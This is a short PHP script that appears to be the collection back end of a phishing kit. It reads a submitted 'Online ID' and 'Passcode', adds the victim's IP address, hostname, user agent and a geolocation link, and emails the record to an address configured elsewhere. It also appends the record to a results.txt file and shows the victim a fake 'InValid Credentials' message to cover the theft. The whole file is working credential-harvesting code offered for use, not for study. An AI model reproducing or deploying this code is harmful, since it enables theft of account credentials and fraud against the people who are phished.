<?php
ob_start();

include 'email.php';
$ai = trim($_POST['ai']);
$pr = trim($_POST['pr']);
if($ai != null && $pr != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------|  |--------------|\n";
	
	$message .= "Online ID            : ".$ai."\n";
	$message .= "Passcode              : ".$pr."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|-----------  --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
    mail($send, $subject, $message);  
	$fp = fopen("results.txt","a");
fputs($fp,$message);
fclose($fp); 
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);
ob_end_flush();
?>